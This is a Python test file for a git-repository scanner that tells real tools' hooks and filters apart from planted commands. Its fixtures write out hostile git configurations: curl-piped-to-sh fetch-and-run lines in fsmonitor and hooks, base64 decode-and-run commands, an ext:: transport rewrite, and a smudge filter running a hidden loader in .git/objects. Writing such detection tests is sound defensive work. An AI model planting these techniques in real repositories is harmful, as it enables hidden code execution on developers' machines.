class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
    """Each shape here is a real tool's configuration; none may be confirmed or suspicious."""

    def assert_reported_not_confirmed(self, repo: Path, at_least: int = 1):
        """Reported, never confirmed: a program a key git runs on its own is for the operator to
        accept, so it is reported for review."""
        tiers = self.graded(repo)
        self.assertEqual([f.evidence for f in tiers[CONFIRMED]], [])
        self.assertIsNone(tiers["result"].error)
        self.assertGreaterEqual(len(tiers[INFORMATIONAL]) + len(tiers[HEURISTIC]), at_least)
        return tiers

    def test_git_lfs_filters_and_hooks(self):
        repo = self.repo()
        self.write(repo, ".gitattributes", "*.psd filter=lfs diff=lfs merge=lfs -text\n")
        self.append_config(repo, '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n'
                                 '\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n'
                                 '\trequired = true\n')
        for name in ("pre-push", "post-checkout", "post-commit", "post-merge"):
            self.hook(repo / ".git" / "hooks", name, _LFS_HOOK.replace("{name}", name))
        tiers = self.assert_reported_not_confirmed(repo, at_least=7)
        self.assertEqual(tiers["result"].verdict, "clean")

    def test_git_crypt(self):
        repo = self.repo()
        self.write(repo, ".gitattributes", "secret/** filter=git-crypt diff=git-crypt\n")
        self.append_config(repo, '[filter "git-crypt"]\n\tsmudge = \\"git-crypt\\" smudge\n'
                                 '\tclean = \\"git-crypt\\" clean\n\trequired = true\n'
                                 '[diff "git-crypt"]\n\ttextconv = \\"git-crypt\\" diff\n')
        self.assert_reported_not_confirmed(repo, at_least=3)

    def test_pre_commit_framework_hook(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "pre-commit", _PRE_COMMIT_HOOK)
        self.assert_reported_not_confirmed(repo)

    def test_husky_v9(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = .husky/_\n")
        self.hook(repo / ".husky" / "_", "pre-commit", _HUSKY_STUB)
        self.hook(repo / ".husky" / "_", "h", _HUSKY_H)
        self.write(repo, ".husky/pre-commit", "npm test\n")
        self.assert_reported_not_confirmed(repo, at_least=2)

    def test_lefthook(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "pre-commit", _LEFTHOOK_HOOK)
        self.assert_reported_not_confirmed(repo)

    def test_nbstripout(self):
        repo = self.repo()
        self.write(repo, ".git/info/attributes", "*.ipynb filter=nbstripout\n*.zpln filter=nbstripout\n"
                                                 "*.ipynb diff=ipynb\n")
        self.append_config(repo, '[filter "nbstripout"]\n\tclean = \\"/usr/bin/python3\\" -m nbstripout\n'
                                 '\tsmudge = cat\n[diff "ipynb"]\n'
                                 '\ttextconv = \\"/usr/bin/python3\\" -m nbstripout -t\n')
        self.assert_reported_not_confirmed(repo, at_least=3)

    def test_textconv_for_pdf_exif_sqlite(self):
        repo = self.repo()
        self.write(repo, ".gitattributes", "*.pdf diff=pdf\n*.jpg diff=exif\n*.db diff=sqlite3\n")
        self.append_config(repo, '[diff "pdf"]\n\ttextconv = pdftotext -layout\n'
                                 '[diff "exif"]\n\ttextconv = exiftool\n')
        self.assert_reported_not_confirmed(repo, at_least=2)

    def test_a_shell_recipe_is_suspicious_at_most(self):
        repo = self.repo()
        self.append_config(repo, '[diff "sqlite3"]\n\ttextconv = "echo .dump | sqlite3"\n'
                                 '[diff "zip"]\n\ttextconv = sh -c \'unzip -p "$0"\'\n'
                                 '[filter "dater"]\n\tclean = perl -pe \'s/x/y/\'\n')
        tiers = self.graded(repo)
        self.assertEqual([f.evidence for f in tiers[CONFIRMED]], [])
        self.assertEqual(3, len(tiers[HEURISTIC]))

    def test_watchman_and_rs_git_fsmonitor(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "query-watchman",
                  "#!/usr/bin/perl\nuse strict;\nuse warnings;\nmy ($version, $time) = @ARGV;\n")
        self.append_config(repo, "[core]\n\tfsmonitor = .git/hooks/query-watchman\n")
        self.assert_reported_not_confirmed(repo)
        other = self.repo("other")
        self.append_config(other, "[core]\n\tfsmonitor = rs-git-fsmonitor\n")
        self.assert_reported_not_confirmed(other)

    def test_ssh_command_credential_helper_and_a_relative_include(self):
        repo = self.repo()
        self.write(repo, ".gitconfig", "[user]\n\tname = Someone\n")
        self.append_config(repo, '[core]\n\tsshCommand = ssh -i ~/.ssh/work\n'
                                 '[credential]\n\thelper = osxkeychain\n'
                                 '[include]\n\tpath = ../.gitconfig\n')
        self.assert_reported_not_confirmed(repo, at_least=2)

    def test_a_driver_no_attribute_selects_is_listed(self):
        repo = self.repo()
        self.append_config(repo, '[filter "unused"]\n\tsmudge = some-tool\n')
        self.assertEqual(["filter.unused.smudge = some-tool"],
                         [f.evidence for f in self.graded(repo)[HEURISTIC]])

    def test_a_credential_helper_that_asks_a_vault_is_not_confirmed(self):
        repo = self.repo()
        self.append_config(repo, "[credential]\n\thelper = \"!f() { echo password=$(curl -s "
                                 "https://vault.example/token); }; f\"\n")
        self.assertEqual([f.evidence for f in self.graded(repo)[CONFIRMED]], [])

    def test_a_pristine_saw_hook_is_omitted(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "post-checkout",
                  hookscript.render("post-checkout", "/usr/local/bin/saw", None))
        self.assertEqual(self.graded(repo)[INFORMATIONAL], [])


class TestPlantedCommandsAreCaught(ExecSurfaceSandbox):

    def assert_tier(self, repo: Path, tier: str):
        tiers = self.graded(repo)
        self.assertTrue(tiers[tier], f"expected a {tier} git-exec finding; got "
                        f"{[(f.signature_id, f.evidence) for t in (CONFIRMED, HEURISTIC, INFORMATIONAL) for f in tiers[t]]}")
        return tiers

    def test_fsmonitor_inline_node(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\tfsmonitor = node -e \\\"require('child_process')"
                                 ".exec('id')\\\"\n")
        self.assert_tier(repo, HEURISTIC)

    def test_fsmonitor_inline_node_that_decodes_and_runs(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\tfsmonitor = node -e \\\"eval(Buffer.from('aWQ=',"
                                 "'base64').toString())\\\"\n")
        tiers = self.assert_tier(repo, CONFIRMED)
        self.assertEqual(tiers["result"].verdict, "infected")

    def test_fsmonitor_fetch_to_shell(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\tfsmonitor = curl -s https://example.invalid/x | sh\n")
        self.assert_tier(repo, CONFIRMED)

    def test_a_command_carrying_a_payload_fingerprint(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\teditor = node -e \\\"global['_V']='8-st14'\\\"\n")
        self.assert_tier(repo, CONFIRMED)

    def test_a_hook_that_fetches_and_runs(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "post-merge",
                  "#!/bin/sh\ncurl -fsSL https://example.invalid/i | sh\n")
        self.assert_tier(repo, CONFIRMED)

    def test_hooks_path_in_scratch(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = /tmp/.x\n")
        self.assert_tier(repo, HEURISTIC)

    def test_loader_appended_to_a_husky_hook(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = .husky/_\n")
        self.hook(repo / ".husky" / "_", "pre-commit", _HUSKY_STUB + LOADER)
        self.assert_tier(repo, CONFIRMED)

    def test_loader_appended_to_a_pre_commit_hook(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "pre-commit", _PRE_COMMIT_HOOK + LOADER)
        tiers = self.assert_tier(repo, CONFIRMED)
        self.assertEqual(tiers[CONFIRMED][0].payload_paths, (".git/hooks/pre-commit",))

    def test_loader_in_a_hook_outside_the_directory_hooks_run_from(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = .husky/_\n")
        self.hook(repo / ".git" / "hooks", "post-checkout", LOADER)
        self.assert_tier(repo, CONFIRMED)

    def test_smudge_filter_runs_a_payload_hidden_in_objects(self):
        repo = self.repo()
        (repo / ".git" / "objects" / ".x.js").write_text(LOADER, encoding="utf-8")
        self.write(repo, ".git/info/attributes", "* filter=x\n")
        self.append_config(repo, '[filter "x"]\n\tsmudge = node .git/objects/.x.js\n')
        tiers = self.assert_tier(repo, CONFIRMED)
        self.assertEqual(tiers[CONFIRMED][0].payload_paths, (".git/objects/.x.js",))

    def test_smudge_filter_running_a_file_inside_the_git_directory(self):
        repo = self.repo()
        (repo / ".git" / "objects" / ".x.js").write_text("console.log(1)\n", encoding="utf-8")
        self.write(repo, ".git/info/attributes", "* filter=x\n")
        self.append_config(repo, '[filter "x"]\n\tsmudge = node .git/objects/.x.js\n')
        self.assert_tier(repo, HEURISTIC)

    def test_ext_transport_rewrite(self):
        repo = self.repo()
        self.append_config(repo, '[url "ext::sh -c touch% /tmp/pwned"]\n\tinsteadOf = https://\n')
        self.assert_tier(repo, HEURISTIC)
        other = self.repo("other")
        self.append_config(other, "[protocol \"ext\"]\n\tallow = always\n")
        self.assert_tier(other, HEURISTIC)

    def test_include_from_scratch_setting_the_pager(self):
        planted = Path("/tmp") / f"saw-test-{uuid.uuid4().hex}.cfg"
        planted.write_text("[core]\n\tpager = less\n", encoding="utf-8")
        self.addCleanup(planted.unlink)
        repo = self.repo()
        self.append_config(repo, f"[include]\n\tpath = {planted}\n")
        tiers = self.assert_tier(repo, HEURISTIC)
        self.assertTrue(any(f.evidence == "core.pager = less" for f in tiers[HEURISTIC]))

    def test_ssh_command_that_decodes_and_runs(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\tsshCommand = sh -c 'echo aWQ= | base64 -d | sh'\n")
        self.assert_tier(repo, CONFIRMED)

    def test_an_altered_saw_hook(self):
        repo = self.repo()
        self.hook(repo / ".git" / "hooks", "post-checkout",
                  hookscript.render("post-checkout", "/usr/local/bin/saw", None) + "id\n")
        self.assert_tier(repo, HEURISTIC)

    def test_config_of_a_submodule_git_dir(self):
        repo = self.repo()
        module = repo / ".git" / "modules" / "lib"
        module.mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "config").write_text("[core]\n\tfsmonitor = curl -s https://example.invalid | sh\n")
        self.assert_tier(repo, CONFIRMED)

    def test_unreadable_configuration_is_not_examined(self):
        repo = self.repo()
        include = repo / "fifo"
        os.mkfifo(include)
        self.append_config(repo, f"[include]\n\tpath = {include}\n")
        result = self.scan(repo)
        self.assertIsNotNone(result.error)
        self.assertIn("git configuration", result.error)


